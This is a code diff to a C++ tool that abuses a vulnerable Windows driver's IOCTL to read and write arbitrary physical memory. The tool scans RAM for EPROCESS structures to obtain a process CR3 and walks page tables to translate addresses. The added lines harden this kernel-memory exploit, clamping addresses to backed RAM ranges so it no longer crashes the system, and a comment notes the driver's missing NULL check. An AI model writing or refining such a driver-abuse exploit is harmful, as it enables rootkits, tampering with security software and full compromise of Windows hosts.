@@ -25,7 +25,13 @@ static constexpr uint64_t MYPORT_PTE_ADDR_MASK = 0x000FFFFFFFFFF000ULL;
 static constexpr uint64_t MYPORT_PDPTE_1GB_ADDR_MASK = 0x000FFFFFC0000000ULL;
 static constexpr uint64_t MYPORT_PDE_2MB_ADDR_MASK = 0x000FFFFFFFE00000ULL;
 
+static bool MyPortPaBacked(uint64_t pa, uint32_t bytes);
+
 static bool MyPortRead32(HANDLE h, uint64_t pa, uint32_t* out) {
+    if (!MyPortPaBacked(pa, 4)) return false;
+    // IOCTL 0x9C406680 MmMapIoSpace's then dereferences with no NULL check.
+    // A hole bugchecks 0x3B at MyPortIO_x64+0x25a4 (dump 111326-11531).
+    if (pa > 0xFFFFFFFCu) return false;
     uint8_t pkt[16]{};
     *reinterpret_cast<uint64_t*>(pkt) = pa;
     *reinterpret_cast<uint32_t*>(pkt + 8) = 4;
@@ -37,6 +43,7 @@ static bool MyPortRead32(HANDLE h, uint64_t pa, uint32_t* out) {
 }
 
 static bool MyPortWrite32(HANDLE h, uint64_t pa, uint32_t value) {
+    if (!MyPortPaBacked(pa, 4)) return false;
     uint8_t pkt[16]{};
     *reinterpret_cast<uint64_t*>(pkt) = pa;
     *reinterpret_cast<uint32_t*>(pkt + 8) = 4;
@@ -146,6 +153,13 @@ static bool MyPortInRange(uint64_t addr, const std::vector<MyPortRange>& ranges)
     return false;
 }
 
+static bool MyPortPaBacked(uint64_t pa, uint32_t bytes) {
+    if (!bytes || pa > 0xFFFFFFFFull || bytes - 1 > 0xFFFFFFFFull - pa) return false;
+    static const std::vector<MyPortRange> ranges = MyPortRanges();
+    if (ranges.empty()) return false;
+    return MyPortInRange(pa, ranges) && MyPortInRange(pa + bytes - 1, ranges);
+}
+
 static uint64_t MyPortVirtToPhysSafe(HANDLE h, uint64_t cr3, uint64_t va, const std::vector<MyPortRange>& ranges) {
     auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };
     uint64_t a0 = (cr3 & MYPORT_PTE_ADDR_MASK) + idx(39) * 8;
@@ -208,9 +222,16 @@ static uint64_t MyPortBootstrapCR3(HANDLE h) {
         { 0x338, 0x1D0, 0x028, 0x1D8 },
         { 0x5A8, 0x440, 0x028, 0x448 },
     };
-    printf("[*] MyPort EPROCESS scan 0x100000-0x%llx\n", (unsigned long long)kScanHi);
-    for (uint64_t pa = 0x100000; pa < kScanHi && !cr3; pa += 0x1000) {
-        if ((pa & 0xFFFFFF) == 0)
+    printf("[*] MyPort EPROCESS scan inside RAM ranges, below 0x%llx\n",
+           (unsigned long long)kScanHi);
+    for (const auto& range : ranges) {
+        if (cr3) break;
+        uint64_t lo = range.lo > 0x100000ull ? range.lo : 0x100000ull;
+        uint64_t hi = range.hi < kScanHi ? range.hi : kScanHi;
+        lo = (lo + 0xFFF) & ~0xFFFULL;
+        hi &= ~0xFFFULL;
+        for (uint64_t pa = lo; pa + 0x1000 <= hi && !cr3; pa += 0x1000) {
+        if ((pa & 0xFFFF) == 0)
             printf("[*]   MyPort scan: 0x%llx\n", (unsigned long long)pa);
         for (const auto& o : offs) {
             uint32_t head = 0;
@@ -231,6 +252,7 @@ static uint64_t MyPortBootstrapCR3(HANDLE h) {
                 cr3 = dtb;
                 break;
             }
+        }
         }
     }
     printf("[+] MyPort CR3=0x%llx\n", (unsigned long long)cr3);
